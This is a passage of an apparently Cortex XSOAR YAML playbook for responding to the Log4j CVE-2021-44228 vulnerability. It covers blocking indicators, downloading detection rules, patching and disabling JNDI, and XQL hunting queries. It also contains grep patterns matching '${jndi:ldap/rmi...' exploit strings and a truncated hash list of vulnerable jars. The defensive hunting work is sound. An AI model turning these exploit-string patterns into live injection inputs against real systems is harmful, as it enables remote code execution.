      - - operator: isEqualString
          left:
            value:
              complex:
                root: inputs.BlockIndicatorsAutomatically
            iscontext: true
          right:
            value:
              simple: "True"
          ignorecase: true
    view: |-
      {
        "position": {
          "x": 1240,
          "y": 1830
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "40":
    id: "40"
    taskid: c0e5d544-60fe-4f2e-8f97-3c7d2c2b01eb
    type: regular
    task:
      id: c0e5d544-60fe-4f2e-8f97-3c7d2c2b01eb
      version: -1
      name: Block indicators manually
      description: Manually block the IOCs in the relevant systems.
      type: regular
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "74"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1690,
          "y": 2050
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "41":
    id: "41"
    taskid: 5e08d7d7-d2c2-42f5-89c1-4f614163ed70
    type: playbook
    task:
      id: 5e08d7d7-d2c2-42f5-89c1-4f614163ed70
      version: -1
      name: PAN-OS - Block Domain - External Dynamic List
      description: |-
        This playbook blocks Domains using Palo Alto Networks Panorama or Firewall External Dynamic Lists.
        It checks if the EDL configuration is in place with the 'PAN-OS EDL Setup' sub-playbook
        (otherwise the list will be configured), and adds the input Domains to the relevant lists.
      playbookName: PAN-OS - Block Domain - External Dynamic List
      type: playbook
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "74"
    scriptarguments:
      AutoCommit:
        simple: "No"
      Domain:
        complex:
          root: ExtractedIndicators
          accessor: Domain
      DomainListName:
        complex:
          root: inputs.EDLDomainBlocklist
      pre-post-rulebase:
        simple: pre-rulebase
    separatecontext: true
    loop:
      iscommand: false
      scriptArguments:
        AutoCommit:
          simple: "No"
        Domain:
          complex:
            root: ExtractedIndicators
            accessor: Domain
        DomainListName:
          complex:
            root: inputs.EDLDomainBlocklist
        pre-post-rulebase:
          simple: pre-rulebase
      exitCondition: ""
      wait: 1
      max: 100
    view: |-
      {
        "position": {
          "x": 790,
          "y": 2050
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: true
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "42":
    id: "42"
    taskid: 32b1536e-f572-451f-85a0-9879bc75ada6
    type: title
    task:
      id: 32b1536e-f572-451f-85a0-9879bc75ada6
      version: -1
      name: Mitigation
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "50"
      - "52"
      - "53"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1240,
          "y": 3340
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "43":
    id: "43"
    taskid: 2257cedf-d51f-4515-857c-8971bc9622b4
    type: regular
    task:
      id: 2257cedf-d51f-4515-857c-8971bc9622b4
      version: -1
      name: Install log4j patched versions
      description: |-
        Please patch with one of the following versions:
        **log4j-2.15.0-rc2**
        **log4j-2.16.0**

        The files are available via the following link:
        [Download Apache Log4j 2](https://logging.apache.org/log4j/2.x/download.html)
      type: regular
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "49"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1520,
          "y": 3640
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "44":
    id: "44"
    taskid: 3d60ca10-e2ac-4ee5-8926-3176be171877
    type: regular
    task:
      id: 3d60ca10-e2ac-4ee5-8926-3176be171877
      version: -1
      name: Disable JNDI lookup
      description: |-
        Disable JNDI lookup on vulnerable servers:

        * Remove the JndiLookup file in the log4j-core and restart the service
        * Setup spring.jndi.ignore=true
      type: regular
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "49"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1990,
          "y": 3640
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "45":
    id: "45"
    taskid: c051ec61-e3cd-4906-800f-7be75c8d1e16
    type: condition
    task:
      id: c051ec61-e3cd-4906-800f-7be75c8d1e16
      version: -1
      name: Analysis resolution - Should continue with the investigation?
      description: Check with the analyst whether to continue with the investigation.
      type: condition
      iscommand: false
      brand: ""
    nexttasks:
      "No":
      - "48"
      "Yes":
      - "47"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1240,
          "y": 3990
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    message:
      to:
      subject:
      body:
        simple: Do you need to continue with the investigation?
      methods: []
      format: ""
      bcc:
      cc:
      timings:
        retriescount: 2
        retriesinterval: 360
        completeafterreplies: 1
      replyOptions:
      - "Yes"
      - "No"
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "46":
    id: "46"
    taskid: 1e16fdd6-5b62-44be-86e0-e5e50e7fa045
    type: title
    task:
      id: 1e16fdd6-5b62-44be-86e0-e5e50e7fa045
      version: -1
      name: Done
      type: title
      iscommand: false
      brand: ""
      description: ''
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1240,
          "y": 4450
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "47":
    id: "47"
    taskid: 79f42889-be16-4b8d-8f3c-085a10908aa8
    type: regular
    task:
      id: 79f42889-be16-4b8d-8f3c-085a10908aa8
      version: -1
      name: Investigate Further
      description: Manual step for further incident investigation.
      type: regular
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "46"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 790,
          "y": 4240
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "48":
    id: "48"
    taskid: 557f24c6-338b-4d52-844d-3ba121f0748b
    type: regular
    task:
      id: 557f24c6-338b-4d52-844d-3ba121f0748b
      version: -1
      name: Close Investigation
      description: Close the current incident
      script: Builtin|||closeInvestigation
      type: regular
      iscommand: true
      brand: Builtin
    nexttasks:
      '#none#':
      - "46"
    scriptarguments:
      closeReason:
        simple: No further actions are required.
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1240,
          "y": 4240
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "49":
    id: "49"
    taskid: 0f822bab-d9cd-47a6-8813-ad10cb60596a
    type: title
    task:
      id: 0f822bab-d9cd-47a6-8813-ad10cb60596a
      version: -1
      name: Resolution
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "45"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1240,
          "y": 3830
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "50":
    id: "50"
    taskid: e287cfae-32f1-4371-86cf-8f19c23e6919
    type: title
    task:
      id: e287cfae-32f1-4371-86cf-8f19c23e6919
      version: -1
      name: Unit42 Recommended Mitigations
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "51"
      - "44"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 2220,
          "y": 3490
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "51":
    id: "51"
    taskid: 0a3f1370-bbe1-4392-892b-696637aebbf5
    type: regular
    task:
      id: 0a3f1370-bbe1-4392-892b-696637aebbf5
      version: -1
      name: PANW - Disable suspicious outbound traffic
      description: Disable suspicious outbound traffic, such as LDAP and RMI on the
        server in PANW Firewall.
      type: regular
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "49"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 2450,
          "y": 3640
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "52":
    id: "52"
    taskid: cfada905-5e8e-4dbf-8291-0c795e273c91
    type: title
    task:
      id: cfada905-5e8e-4dbf-8291-0c795e273c91
      version: -1
      name: Patch Vulnerability
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "43"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1520,
          "y": 3490
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "53":
    id: "53"
    taskid: 03101a9d-5b49-46a8-8a2c-0b74f404c3a8
    type: title
    task:
      id: 03101a9d-5b49-46a8-8a2c-0b74f404c3a8
      version: -1
      name: Deploy Detection Rules
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "54"
      - "55"
      - "64"
      - "65"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 320,
          "y": 3490
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "54":
    id: "54"
    taskid: c15c4a80-582c-4821-852a-664435fc45ec
    type: regular
    task:
      id: c15c4a80-582c-4821-852a-664435fc45ec
      version: -1
      name: Snort Rules
      description: |-
        Snort rules file has been downloaded as emerging-exploit-snort.rules and is available for download directly from XSOAR.
        Please note the log4j rules are part of the latest released package.
      type: regular
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "49"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 540,
          "y": 3640
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "55":
    id: "55"
    taskid: db11fc9e-4512-419f-80b1-12614a130a1c
    type: regular
    task:
      id: db11fc9e-4512-419f-80b1-12614a130a1c
      version: -1
      name: Suricata Rules
      description: |-
        Suricata rules file has been downloaded as emerging-exploit-suricata.rules and is available for download directly from XSOAR.
        Please note the log4j rules are part of the latest released package.
      type: regular
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "49"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 980,
          "y": 3640
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "57":
    id: "57"
    taskid: 8d5e18f6-03d8-46eb-8115-e4dcf1a7a0b7
    type: regular
    task:
      id: 8d5e18f6-03d8-46eb-8115-e4dcf1a7a0b7
      version: -1
      name: Tag IP indicators
      description: commands.local.cmd.new.indicator
      script: Builtin|||createNewIndicator
      type: regular
      iscommand: true
      brand: Builtin
    nexttasks:
      '#none#':
      - "15"
    scriptarguments:
      retry-count:
        simple: "3"
      retry-interval:
        simple: "2"
      tags:
        simple: CVE-2021-44228
      type:
        simple: IP
      value:
        complex:
          root: ExtractedIndicators.IP
          filters:
          - - operator: isNotEmpty
              left:
                value:
                  simple: ExtractedIndicators.IP
                iscontext: true
          transformers:
          - operator: uniq
      verdict:
        complex:
          root: inputs.CollectedIndicatorsSeverity
    continueonerror: true
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1010,
          "y": -270
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "58":
    id: "58"
    taskid: 73aa56d1-c1e1-4b1b-8b8f-bf5b70ea3037
    type: regular
    task:
      id: 73aa56d1-c1e1-4b1b-8b8f-bf5b70ea3037
      version: -1
      name: Tag CVE indicators
      description: commands.local.cmd.new.indicator
      script: Builtin|||createNewIndicator
      type: regular
      iscommand: true
      brand: Builtin
    nexttasks:
      '#none#':
      - "15"
    scriptarguments:
      retry-count:
        simple: "3"
      retry-interval:
        simple: "2"
      tags:
        simple: CVE-2021-44228
      type:
        simple: CVE
      value:
        simple: CVE-2021-44228
    continueonerror: true
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1450,
          "y": -270
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "60":
    id: "60"
    taskid: 8ea51d16-1d64-40e6-8d3a-d5a459ffaf70
    type: playbook
    task:
      id: 8ea51d16-1d64-40e6-8d3a-d5a459ffaf70
      version: -1
      name: QRadarFullSearch
      description: This playbook runs a QRadar query and return its results to the
        context.
      playbookName: QRadarFullSearch
      type: playbook
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "37"
    scriptarguments:
      interval:
        simple: "1"
      query_expression:
        complex:
          root: QRadarQuery
      timeout:
        simple: "600"
    separatecontext: true
    loop:
      iscommand: false
      exitCondition: ""
      wait: 1
      max: 0
    view: |-
      {
        "position": {
          "x": -550,
          "y": 1100
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: true
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "62":
    id: "62"
    taskid: a1977803-9662-492d-83be-114943c90bc0
    type: regular
    task:
      id: a1977803-9662-492d-83be-114943c90bc0
      version: -1
      name: Download Yara Rules
      description: Download Yara Rules
      scriptName: http
      type: regular
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "8"
    scriptarguments:
      filename:
        simple: YaraRules.yar
      method:
        simple: GET
      saveAsFile:
        simple: "yes"
      url:
        simple: https://raw.githubusercontent.com/Neo23x0/signature-base/master/yara/expl_log4j_cve_2021_44228.yar
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 310,
          "y": -980
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: true
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "63":
    id: "63"
    taskid: 07bf0245-e362-4f84-8477-86794355006c
    type: regular
    task:
      id: 07bf0245-e362-4f84-8477-86794355006c
      version: -1
      name: Download Sigma Rules
      description: Download Sigma Rules
      scriptName: http
      type: regular
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "8"
    scriptarguments:
      filename:
        simple: SigmaRules.yml
      method:
        simple: GET
      saveAsFile:
        simple: "yes"
      url:
        simple: https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/web/web_cve_2021_44228_log4j_fields.yml
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 770,
          "y": -980
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: true
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "64":
    id: "64"
    taskid: d77d3d59-c4f0-46f3-8fec-2184ce957fe6
    type: regular
    task:
      id: d77d3d59-c4f0-46f3-8fec-2184ce957fe6
      version: -1
      name: Sigma Rules
      description: Sigma rules file has been downloaded as SigmaRules.yml and is available
        for download directly from XSOAR.
      type: regular
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "49"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 100,
          "y": 3640
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "65":
    id: "65"
    taskid: 121e4b4e-e536-4d95-8f0e-59053753af98
    type: regular
    task:
      id: 121e4b4e-e536-4d95-8f0e-59053753af98
      version: -1
      name: Yara Rules
      description: Yara rules file has been downloaded asYaraRules.yar and is available
        for download directly from XSOAR.
      type: regular
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "49"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": -340,
          "y": 3640
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "66":
    id: "66"
    taskid: f42f4f3c-fe3e-401f-8bf0-8629a306ec71
    type: title
    task:
      id: f42f4f3c-fe3e-401f-8bf0-8629a306ec71
      version: -1
      name: Collect Detection Rules
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "7"
      - "6"
      - "63"
      - "62"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 770,
          "y": -1130
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "69":
    id: "69"
    taskid: 44e0b4cc-b79d-4a42-8f59-30796d55810e
    type: condition
    task:
      id: 44e0b4cc-b79d-4a42-8f59-30796d55810e
      version: -1
      name: Check if Cortex XDR - IR is Enabled
      description: Returns 'yes' if integration brand is available. Otherwise returns
        'no'
      scriptName: IsIntegrationAvailable
      type: condition
      iscommand: false
      brand: ""
    nexttasks:
      "no":
      - "37"
      "yes":
      - "32"
    scriptarguments:
      brandname:
        simple: Cortex XDR - IR
    results:
    - brandInstances
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 2390,
          "y": 720
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "70":
    id: "70"
    taskid: 53d15412-db04-4d28-8e08-99b539b1cff9
    type: regular
    task:
      id: 53d15412-db04-4d28-8e08-99b539b1cff9
      version: -1
      name: Retrieve All Endpoint IDs
      description: Gets a list of endpoints, according to the passed filters. If there
        are no filters, all endpoints are returned. Filtering by multiple fields will
        be concatenated using AND condition (OR is not supported). Maximum result
        set size is 100. Offset is the zero-based number of endpoint from the start
        of the result set (start by counting from 0).
      script: '|||xdr-get-endpoints'
      type: regular
      iscommand: true
      brand: ""
    nexttasks:
      '#none#':
      - "71"
      - "73"
    scriptarguments:
      platform:
        simple: linux
    continueonerror: true
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 2870,
          "y": 1235
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "71":
    id: "71"
    taskid: 30d08296-84a7-48fa-8dde-271c04f1f9a2
    type: playbook
    task:
      id: 30d08296-84a7-48fa-8dde-271c04f1f9a2
      version: -1
      name: Hunt /var/log for exploitation patterns - Uncompressed
      description: Initiates a new script execution of shell commands.
      playbookName: Cortex XDR - Execute commands
      type: playbook
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "37"
    scriptarguments:
      commands:
        simple: sudo egrep -i -r '\$\{jndi:(ldap[s]?|rmi|dns|corba|iiop|nis|nds):/[^\n]+'
      endpoint_ids:
        complex:
          root: PaloAltoNetworksXDR.Endpoint
          filters:
          - - operator: isEqualString
              left:
                value:
                  simple: PaloAltoNetworksXDR.Endpoint.endpoint_status
                iscontext: true
              right:
                value:
                  simple: CONNECTED
              ignorecase: true
          - - operator: isEqualString
              left:
                value:
                  simple: PaloAltoNetworksXDR.Endpoint.os_type
                iscontext: true
              right:
                value:
                  simple: AGENT_OS_LINUX
              ignorecase: true
          accessor: endpoint_id
      polling_timeout:
        simple: "5"
    separatecontext: false
    loop:
      iscommand: false
      scriptArguments:
        commands:
          simple: pwd
        endpoint_ids:
          complex:
            root: PaloAltoNetworksXDR.Endpoint
            filters:
            - - operator: isEqualString
                left:
                  value:
                    simple: PaloAltoNetworksXDR.Endpoint.endpoint_status
                  iscontext: true
                right:
                  value:
                    simple: CONNECTED
                ignorecase: true
            accessor: endpoint_id
        polling_timeout:
          simple: "10"
      exitCondition: ""
      wait: 1
      max: 100
    view: |-
      {
        "position": {
          "x": 2870,
          "y": 1430
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "72":
    id: "72"
    taskid: aab63326-8c15-409c-8797-130c537c7cd7
    type: regular
    task:
      id: aab63326-8c15-409c-8797-130c537c7cd7
      version: -1
      name: Retrieve specified endpoint IDs
      description: Gets a list of endpoints, according to the passed filters. If there
        are no filters, all endpoints are returned. Filtering by multiple fields will
        be concatenated using AND condition (OR is not supported). Maximum result
        set size is 100. Offset is the zero-based number of endpoint from the start
        of the result set (start by counting from 0).
      script: '|||xdr-get-endpoints'
      type: regular
      iscommand: true
      brand: ""
    nexttasks:
      '#none#':
      - "71"
      - "73"
    scriptarguments:
      endpoint_id_list:
        complex:
          root: inputs.XDREndpointIDs
      platform:
        simple: linux
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 3320,
          "y": 1235
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "73":
    id: "73"
    taskid: 511d52a4-f1f3-4164-8cb7-fdbea90dd7ef
    type: playbook
    task:
      id: 511d52a4-f1f3-4164-8cb7-fdbea90dd7ef
      version: -1
      name: Hunt /var/log for exploitation patterns - Compressed
      description: Initiates a new script execution of shell commands.
      playbookName: Cortex XDR - Execute commands
      type: playbook
      iscommand: false
      brand: ""
    nexttasks:
      '#none#':
      - "37"
    scriptarguments:
      commands:
        simple: sudo find /var/log -name \*.gz -print0 | xargs -0 zgrep -E -i '\$\{jndi:(ldap[s]?|rmi|dns|corba|iiop|nis|nds):/[^\n]+'
      endpoint_ids:
        complex:
          root: PaloAltoNetworksXDR.Endpoint
          filters:
          - - operator: isEqualString
              left:
                value:
                  simple: PaloAltoNetworksXDR.Endpoint.endpoint_status
                iscontext: true
              right:
                value:
                  simple: CONNECTED
              ignorecase: true
          - - operator: isEqualString
              left:
                value:
                  simple: PaloAltoNetworksXDR.Endpoint.os_type
                iscontext: true
              right:
                value:
                  simple: AGENT_OS_LINUX
              ignorecase: true
          accessor: endpoint_id
      polling_timeout:
        simple: "5"
    separatecontext: false
    loop:
      iscommand: false
      scriptArguments:
        commands:
          simple: pwd
        endpoint_ids:
          complex:
            root: PaloAltoNetworksXDR.Endpoint
            filters:
            - - operator: isEqualString
                left:
                  value:
                    simple: PaloAltoNetworksXDR.Endpoint.endpoint_status
                  iscontext: true
                right:
                  value:
                    simple: CONNECTED
                ignorecase: true
            accessor: endpoint_id
        polling_timeout:
          simple: "10"
      exitCondition: ""
      wait: 1
      max: 100
    view: |-
      {
        "position": {
          "x": 3320,
          "y": 1430
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "74":
    id: "74"
    taskid: ff4c1f7e-767b-44b2-8756-9913b0d585dd
    type: title
    task:
      id: ff4c1f7e-767b-44b2-8756-9913b0d585dd
      version: -1
      name: 'Cortex XDR - XQL Hunting Queries '
      type: title
      iscommand: false
      brand: ""
      description: ''
    nexttasks:
      '#none#':
      - "75"
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 1240,
          "y": 2230
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "75":
    id: "75"
    taskid: c456da36-fb02-43cf-87c0-e50d76a63b50
    type: condition
    task:
      id: c456da36-fb02-43cf-87c0-e50d76a63b50
      version: -1
      name: Should run XQL hunting queries?
      description: Checks whether to execute XDR shell script for exploitation hunting.
      type: condition
      iscommand: false
      brand: ""
    nexttasks:
      '#default#':
      - "42"
      "yes":
      - "80"
    separatecontext: false
    conditions:
    - label: "yes"
      condition:
      - - operator: isEqualString
          left:
            value:
              complex:
                root: inputs.RunXQLHuntingQueries
            iscontext: true
          right:
            value:
              simple: "True"
          ignorecase: true
    view: |-
      {
        "position": {
          "x": 1240,
          "y": 2360
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 0
    isoversize: false
    isautoswitchedtoquietmode: false
  "77":
    id: "77"
    taskid: 89af86c5-e01e-4e68-87f4-0c52b2c9ebee
    type: regular
    task:
      id: 89af86c5-e01e-4e68-87f4-0c52b2c9ebee
      version: -1
      name: Search for process names "java" interacted with "log4j"
      description: Attempting to detect all Log4j jar loading - Trying to find all
        applications that utilize Log4j is nearly impossible, as it is bundled in
        a ton of different software.With that being said, we believe that this query
        will enable you to get at least a partial grip of this package usage within
        your environment.
      tags:
      - UserXQL
      script: '|||xdr-xql-generic-query'
      type: regular
      iscommand: true
      brand: ""
    nexttasks:
      '#none#':
      - "42"
    scriptarguments:
      query:
        simple: |-
          config case_sensitive = false timeframe=30d |
          dataset = xdr_data

          | filter actor_process_image_name contains "java"

          | filter (agent_os_sub_type contains "server" or agent_os_type = ENUM.AGENT_OS_LINUX )

          | filter action_file_name contains "log4j" and action_file_extension = "jar" // testing

          |fields agent_hostname, agent_ip_addresses, actor_effective_username, action_file_name, action_file_path

          | dedup agent_hostname

          | join conflict_strategy = left type=left

          (

          dataset = xdr_data

          |filter event_type = NETWORK AND event_sub_type = NETWORK_STREAM_ACCEPT

          |alter rfc1918_172 = incidr(action_remote_ip, "172.16.0.0/12")

          |alter rfc1918_10 = incidr(action_remote_ip, "10.0.0.0/8")

          |alter rfc1918_192 = incidr(action_remote_ip, "192.168.0.0/16")

          |filter rfc1918_172 = false and rfc1918_10 = false and rfc1918_192 = false

          |comp count_distinct(action_remote_ip) as Count by agent_hostname

          ) as Count_External_IPs (Count_External_IPs.agent_hostname = agent_hostname )

          | filter Count >0
      query_name:
        simple: Search for process names "java" interacted with "log4j"
      time_frame:
        simple: 7 days
    separatecontext: false
    view: |-
      {
        "position": {
          "x": 2970,
          "y": 2850
        }
      }
    note: false
    timertriggers: []
    ignoreworker: false
    skipunavailable: false
    quietmode: 2
    isoversize: false
    isautoswitchedtoquietmode: false
  "78":
    id: "78"
    taskid: e65b7bc4-bae3-453f-858c-d227cd035db6
    type: regular
    task:
      id: e65b7bc4-bae3-453f-858c-d227cd035db6
      version: -1
      name: Detecting a files that matches the SHA256 hash of the Log4j vulnerable
        versions.
      description: Attempt to target all hosts that contain a file that matches the
        SHA256 hash of the Log4j vulnerable versions.
      tags:
      - UserXQL
      script: '|||xdr-xql-generic-query'
      type: regular
      iscommand: true
      brand: ""
    nexttasks:
      '#none#':
      - "42"
    scriptarguments:
      query:
        simple: |-
          dataset = xdr_data
          | fields agent_hostname , action_file_sha256, action_file_path , actor_process_image_sha256 , actor_process_image_path , causality_actor_process_image_sha256 , causality_actor_process_image_path

          | filter action_file_sha256 in ("bf4f41403280c1b115650d470f9b260a5c9042c04d9bcc2a6ca504a66379b2d6", "58e9f72081efff9bdaabd82e3b3efe5b1b9f1666cefe28f429ad7176a6d770ae", "ed285ad5ac6a8cf13461d6c2874fdcd3bf67002844831f66e21c2d0adda43fa4", "dbf88c623cc2ad99d82fa4c575fb105e2083465a47b84d64e2e1a63e183c274e", "a38ddff1e797adb39a08876932bc2538d771ff7db23885fb883fec526aff4fc8", "7d86841489afd1097576a649094ae1efb79b3147cd162ba019861dfad4e9573b", "4bfb0d5022dc499908da4597f3e19f9f64d3cc98ce756a2249c72179d3d75c47", "473f15c04122dad810c919b2f3484d46560fd2dd4573f6695d387195816b02a6", "b3fae4f84d4303cdbad4696554b4e8d2381ad3faf6e0c3c8d2ce60a4388caa02", "dcde6033b205433d6e9855c93740f798951fa3a3f252035a768d9f356fde806d", "85338f694c844c8b66d8a1b981bcf38627f95579209b2662182a009d849e1a4c", "db3906edad6009d1886ec1e2a198249b6d99820a3575f8ec80c6ce57f08d521a", "ec411a34fee49692f196e4dc0a905b25d0667825904862fdba153df5e53183e0", "a00a54e3fb8cb83fab38f8714f240ecc13ab9c492584aa571aec5fc71b48732d", "c584d1000591efa391386264e0d43ec35f4dbb146cad9390f73358d9c84ee78d", "8bdb662843c1f4b120fb4c25a5636008085900cdf9947b1dadb9b672ea6134dc", "c830cde8f929c35dad42cbdb6b28447df69ceffe99937bf420d32424df4d076a", "6ae3b0cb657e051f97835a6432c2b0f50a651b36b6d4af395bbe9060bb4ef4b2", "535e19bf14d8c76ec00a7e8490287ca2e2597cae2de5b8f1f65eb81ef1c2a4c6", "42de36e61d454afff5e50e6930961c85b55d681e23931efd248fd9b9b9297239", "4f53e4d52efcccdc446017426c15001bb0fe444c7a6cdc9966f8741cf210d997", "df00277045338ceaa6f70a7b8eee178710b3ba51eac28c1142ec802157492de6", "28433734bd9e3121e0a0b78238d5131837b9dbe26f1a930bc872bad44e68e44e", "cf65f0d33640f2cd0a0b06dd86a5c6353938ccb25f4ffd14116b4884181e0392", "5bb84e110d5f18cee47021a024d358227612dd6dac7b97fa781f85c6ad3ccee4", "ccf02bb919e1a44b13b366ea1b203f98772650475f2a06e9fac4b3c957a7c3fa", "815a73e20e90a413662eefe8594414684df3d5723edcd76070e1a5aee864616e", "10ef331115cbbd18b5be3f3761e046523f9c95c103484082b18e67a7c36e570c", "dc815be299f81c180aa8d2924f1b015f2c46686e866bc410e72de75f7cd41aae", "9275f5d57709e2204900d3dae2727f5932f85d3813ad31c9d351def03dd3d03d", "f35ccc9978797a895e5bee58fa8c3b7ad6d5ee55386e9e532f141ee8ed2e937d", "5256517e6237b888c65c8691f29219b6658d800c23e81d5167c4a8bbd2a0daa3", "d4485176aea67cc85f5ccc45bb66166f8bfc715ae4a695f0d870a1f8d848cc3d", "3fcc4c1f2f806acfc395144c98b8ba2a80fe1bf5e3ad3397588bbd2610a37100", "057a48fe378586b6913d29b4b10162b4b5045277f1be66b7a01fb7e30bd05ef3", "5dbd6bb2381bf54563ea15bc9fbb6d7094eaf7184e6975c50f8996f77bfc3f2c", 